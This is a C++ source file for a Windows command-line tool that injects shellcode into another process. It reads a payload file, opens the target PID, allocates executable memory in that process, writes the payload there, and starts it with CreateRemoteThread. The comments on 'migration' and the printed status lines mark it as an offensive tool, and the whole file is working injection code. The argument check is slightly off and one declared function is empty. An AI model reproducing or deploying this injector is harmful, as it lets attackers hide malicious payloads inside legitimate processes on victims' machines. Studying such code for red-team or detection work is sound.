#include <windows.h>
#include <stdio.h>
#include <fstream>

// Compiile x86: i686-w64-mingw32-g++-win32 -static-libgcc -static-libstdc++ inject.cpp -o inject.exe
// Compiile x64: x86_64-w64-mingw32-g++-win32 -static-libgcc -static-libstdc++ inject.cpp -o inject.exe 

using namespace std;
void ExecuteShellcode(DWORD pid, unsigned char * shellcode);

main(int argc, char const *argv[])
{

    if (argc < 2)
		{
		printf("Usage: %s <shellcode-file> <PID>\n", argv[0]);
		return 0;
	}

    FILE * file = fopen(argv[2], "r+");
    if (file == NULL){
        printf("[-] Can't read shellcode file !\n");
        return 1;
    }
    fseek(file, 0, SEEK_END);
    long int size = ftell(file);
    fclose(file);
    
    // Reading data to array of unsigned chars
    file = fopen(argv[2], "r+");
    unsigned char * shellcode = (unsigned char *) malloc(size);
    int bytes_read = fread(shellcode, sizeof(unsigned char), size, file);
    fclose(file);
    if(bytes_read != size) {
        printf("[-] Couldn't fully read shellcode\n");
        return 1; 
    }
    printf("[*] Shellcode Size: %d bytes\n", size);

    int pid = atoi(argv[1]);
    printf("[*] Target PID: %d\n",pid);
    HANDLE ProcessHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,FALSE,DWORD(pid));
    if (ProcessHandle != NULL) {
        printf("[*] Process Handle: 0x%x\n",ProcessHandle);
        void * RemoteBuffer = VirtualAllocEx(ProcessHandle,NULL,size,MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if(RemoteBuffer != NULL){
            printf("[*] Remote buffer: 0x%p\n",RemoteBuffer);
            if(!WriteProcessMemory(ProcessHandle,RemoteBuffer,shellcode,size,NULL)){
                printf("[-] WriteProcessMemory failed !\n");
                return 1;
            }

            HANDLE RemoteThread = CreateRemoteThread(ProcessHandle,NULL,0,(LPTHREAD_START_ROUTINE)RemoteBuffer,NULL,0,0);
            //Migration completed...
            if(RemoteThread == NULL){
                printf("[-] Thread creation failed !\n");
                return 1;
            }
        }else{
            printf("[-] Can't allocate memory on target process !\n");
            return 1;              
        }

    }else{
        printf("[-] Can't open target process !\n");
        return 1;        
    }


    printf("[+] Injection successfull !\n");
    return 0;
}

void ExecuteShellcode(DWORD pid, unsigned char * shellcode){

}

